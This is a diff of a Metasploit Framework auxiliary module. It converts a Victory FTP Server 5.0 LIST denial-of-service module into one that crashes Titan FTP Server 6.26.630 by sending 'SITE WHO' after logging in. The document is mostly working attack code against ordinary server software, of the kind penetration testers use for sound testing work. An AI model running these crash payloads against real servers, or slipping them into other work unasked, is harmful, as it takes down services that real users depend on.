@@ -1,3 +1,14 @@
+##
+# $Id$
+##
+
+##
+# This file is part of the Metasploit Framework and may be subject to 
+# redistribution and commercial restrictions. Please see the Metasploit
+# Framework web site for more information on licensing and terms of use.
+# http://metasploit.com/projects/Framework/ 
+##
+
 require 'msf/core'
 
 class Metasploit3 < Msf::Auxiliary
@@ -7,17 +18,18 @@ class Metasploit3 < Msf::Auxiliary
 	
 	def initialize(info = {})
 		super(update_info(info,	
-			'Name'           => 'Victory FTP Server 5.0 LIST DoS',
+			'Name'           => 'Titan FTP Server 6.26.630 SITE WHO DoS',
 			'Description'    => %q{
-				The Victory FTP Server v5.0 can be brought down by sending
-				a very simple LIST command
+				The Titan FTP server v6.26 build 630 can be DoS'd by
+				issuing "SITE WHO".  You need a valid login so you
+				can send this command.
 			},
 			'Author'         => 'kris',
 			'License'        => MSF_LICENSE,
 			'Version'        => '$Revision$',
 			'References'     =>
-				[ [ 'URL', 'http://milw0rm.com/exploits/6834'] ],
-			'DisclosureDate' => 'Oct 24 2008'))
+				[ [ 'URL', 'http://milw0rm.com/exploits/6753'] ],
+			'DisclosureDate' => 'Oct 14 2008'))
 
 		# They're required
 		register_options([
@@ -28,13 +40,9 @@ class Metasploit3 < Msf::Auxiliary
 
 	def run
 		return unless connect_login
-
 		print_status("Sending command...")
-
-		# Try to wait for a response
-		raw_send_recv("LIST /\\\r\n")
-
+		raw_send("SITE WHO\r\n")
+		sleep(1)
 		disconnect
 	end
 end
-
